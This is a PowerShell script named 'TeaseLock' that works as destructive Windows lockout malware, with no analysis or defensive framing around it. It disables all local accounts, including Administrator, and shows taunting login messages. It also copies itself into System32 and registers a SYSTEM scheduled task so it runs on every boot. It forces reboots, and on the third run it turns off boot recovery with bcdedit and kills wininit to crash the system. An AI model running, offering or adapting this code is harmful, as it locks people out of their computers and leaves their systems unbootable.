# Disable ALL Users (Including Administrator)
$users = Get-WmiObject -Class Win32_UserAccount -Filter "LocalAccount=True"
foreach ($user in $users) {
    Disable-LocalUser -Name $user.Name
}

# Restart Tracker (Stored in Registry)
$regPath = "HKLM:\SOFTWARE\TeaseLock"
if (!(Test-Path $regPath)) {
    New-Item -Path $regPath -Force | Out-Null
}

$restartCount = (Get-ItemProperty -Path $regPath -Name "RestartCount" -ErrorAction SilentlyContinue).RestartCount
if ($restartCount -eq $null) {
    $restartCount = 0
}

# Update Login Message & Track Restarts
$systemRegPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"

if ($restartCount -eq 0) {
    New-ItemProperty -Path $systemRegPath -Name "LegalNoticeCaption" -Value "Oh? Trying to log in?" -PropertyType String -Force
    New-ItemProperty -Path $systemRegPath -Name "LegalNoticeText" -Value "Ah~ Sweetheart, you're locked out <3 Try again later~ ;)" -PropertyType String -Force
    $restartCount = 1
}

elseif ($restartCount -eq 1) {
    New-ItemProperty -Path $systemRegPath -Name "LegalNoticeCaption" -Value "Persistent, aren't we?" -PropertyType String -Force
    New-ItemProperty -Path $systemRegPath -Name "LegalNoticeText" -Value "Round two, darling~? You’ll have to wait longer this time~ ;)" -PropertyType String -Force
    $restartCount = 2
}

elseif ($restartCount -eq 2) {
    New-ItemProperty -Path $systemRegPath -Name "LegalNoticeCaption" -Value "Oh dear~ You really tried..." -PropertyType String -Force
    New-ItemProperty -Path $systemRegPath -Name "LegalNoticeText" -Value "Too bad, love~ No more chances <3 See you never~!" -PropertyType String -Force

    # **Final Phase: Break Windows Boot**
    bcdedit /set {current} bootstatuspolicy ignoreallfailures
    bcdedit /set {current} recoveryenabled no
    bcdedit /set {default} bootmenupolicy legacy

    # **Force BSOD**
    Stop-Process -Name "wininit" -Force
}

# Save Restart Count
Set-ItemProperty -Path $regPath -Name "RestartCount" -Value $restartCount -Force

# Ensure Script Runs on Every Boot
$scriptPath = "C:\Windows\System32\TeaseLock.ps1"
$taskName = "TeaseLockAutoRun"

Copy-Item -Path $MyInvocation.MyCommand.Path -Destination $scriptPath -Force

schtasks /create /tn $taskName /tr "powershell -ExecutionPolicy Bypass -File $scriptPath" /sc onstart /ru SYSTEM /f

# Force Restart (No GUI)
shutdown /r /f /t 5
